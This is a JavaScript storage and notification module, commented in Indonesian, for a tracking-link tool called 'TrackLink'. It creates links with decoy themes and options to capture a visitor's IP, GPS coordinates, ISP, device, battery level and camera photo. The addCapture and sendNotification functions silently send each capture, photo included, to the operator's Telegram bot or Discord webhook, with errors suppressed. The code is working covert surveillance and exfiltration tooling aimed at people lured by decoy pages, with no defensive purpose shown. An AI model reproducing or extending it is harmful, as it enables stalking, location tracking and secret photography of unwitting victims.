/**
 * Storage helper: data tracking tersimpan di localStorage
 * + Notifikasi ke Telegram Bot / Discord Webhook
 */

const STORAGE_KEY = 'tracker_links';
const SETTINGS_KEY = 'tracker_settings';

/* ── Settings ─────────────────────────────────────────────── */
export function getSettings() {
  try {
    return JSON.parse(localStorage.getItem(SETTINGS_KEY) || '{}');
  } catch { return {}; }
}

export function saveSettings(settings) {
  localStorage.setItem(SETTINGS_KEY, JSON.stringify(settings));
}

/* ── Links ────────────────────────────────────────────────── */
export function getLinks() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
  } catch { return []; }
}

export function saveLinks(links) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(links));
}

export function getLinkById(id) {
  return getLinks().find(l => l.id === id) || null;
}

export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBattery, trackCamera }) {
  const links = getLinks();
  const id = generateId();
  const newLink = {
    id,
    name: name || `Link #${links.length + 1}`,
    decoyTheme: decoyTheme || 'article',
    options: { trackIp, trackDevice, trackBattery, trackCamera },
    captures: [],
    createdAt: new Date().toISOString(),
  };
  links.unshift(newLink);
  saveLinks(links);
  return newLink;
}

export function addCapture(linkId, capture) {
  const links = getLinks();
  const idx = links.findIndex(l => l.id === linkId);
  if (idx === -1) return null;
  const captureWithMeta = { ...capture, id: generateId(), at: new Date().toISOString() };
  links[idx].captures.push(captureWithMeta);
  saveLinks(links);

  // Kirim notifikasi (Telegram / Discord)
  const settings = getSettings();
  const linkName = links[idx].name;
  sendNotification(settings, linkName, linkId, captureWithMeta);

  return links[idx];
}

export function deleteLink(id) {
  const links = getLinks().filter(l => l.id !== id);
  saveLinks(links);
}

export function clearLinks() {
  saveLinks([]);
}

/* ── Notifikasi ───────────────────────────────────────────── */
async function sendNotification(settings, linkName, linkId, capture) {
  const msg = buildMessage(linkName, linkId, capture);

  // Telegram
  if (settings.telegramToken && settings.telegramChatId) {
    try {
      await fetch(`https://api.telegram.org/bot${settings.telegramToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: settings.telegramChatId,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });

      // Kirim foto jika ada
      if (capture.photo && settings.telegramToken && settings.telegramChatId) {
        const base64Data = capture.photo.split(',')[1];
        const blob = await (await fetch(capture.photo)).blob();
        const fd = new FormData();
        fd.append('chat_id', settings.telegramChatId);
        fd.append('photo', blob, 'capture.jpg');
        fd.append('caption', `📷 Foto dari link: ${linkName}`);
        await fetch(`https://api.telegram.org/bot${settings.telegramToken}/sendPhoto`, {
          method: 'POST',
          body: fd,
        });
      }
    } catch { /* silent */ }
  }

  // Discord
  if (settings.discordWebhook) {
    try {
      await fetch(settings.discordWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: '🎯 TrackLink',
          embeds: [{
            title: `🔔 Capture Baru — ${linkName}`,
            color: 0x00d4ff,
            fields: buildDiscordFields(capture),
            timestamp: new Date().toISOString(),
            footer: { text: `Link ID: ${linkId}` },
          }],
        }),
      });
    } catch { /* silent */ }
  }
}

function buildMessage(linkName, linkId, cap) {
  const lines = [
    `🎯 <b>CAPTURE BARU!</b>`,
    `📌 Link: <b>${linkName}</b> (<code>${linkId}</code>)`,
    ``,
  ];
  if (cap.ip)       lines.push(`🌍 <b>IP:</b> <code>${cap.ip}</code>`);
  if (cap.country)  lines.push(`📍 <b>Lokasi:</b> ${[cap.city, cap.region, cap.country].filter(Boolean).join(', ')}`);
  if (cap.isp)      lines.push(`📡 <b>ISP:</b> ${cap.isp}`);
  if (cap.lat)      lines.push(`🗺 <b>Koordinat:</b> <a href="https://maps.google.com/?q=${cap.lat},${cap.lon}">${Number(cap.lat).toFixed(5)}, ${Number(cap.lon).toFixed(5)}</a>${cap.locationSource === 'GPS' ? ` ✓ GPS ±${cap.gpsAccuracy}m` : ' (IP-based)'}`);
  if (cap.device)   lines.push(`📱 <b>Perangkat:</b> ${cap.device}`);
  if (cap.os)       lines.push(`💻 <b>OS:</b> ${cap.os} — ${cap.browser}`);
  if (cap.battery !== undefined && cap.battery !== null)
                    lines.push(`🔋 <b>Baterai:</b> ${Math.round(cap.battery * 100)}%${cap.charging ? ' ⚡' : ''}`);
  lines.push(``, `⏱ ${new Date(cap.at).toLocaleString('id-ID')}`);
  return lines.join('\n');
}

function buildDiscordFields(cap) {
  const fields = [];
  if (cap.ip)      fields.push({ name: '🌍 IP Address', value: `\`${cap.ip}\``, inline: true });
  if (cap.country) fields.push({ name: '📍 Lokasi', value: [cap.city, cap.region, cap.country].filter(Boolean).join(', '), inline: true });
  if (cap.isp)     fields.push({ name: '📡 ISP', value: cap.isp, inline: true });
  if (cap.lat)     fields.push({ name: '🗺 Koordinat', value: `[${Number(cap.lat).toFixed(5)}, ${Number(cap.lon).toFixed(5)}](https://maps.google.com/?q=${cap.lat},${cap.lon})`, inline: true });
  if (cap.device)  fields.push({ name: '📱 Perangkat', value: cap.device, inline: true });
  if (cap.os)      fields.push({ name: '💻 OS/Browser', value: `${cap.os} — ${cap.browser}`, inline: true });
  if (cap.battery !== undefined && cap.battery !== null)
                   fields.push({ name: '🔋 Baterai', value: `${Math.round(cap.battery * 100)}%${cap.charging ? ' ⚡' : ''}`, inline: true });
  return fields;
}

function generateId() {
  return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}
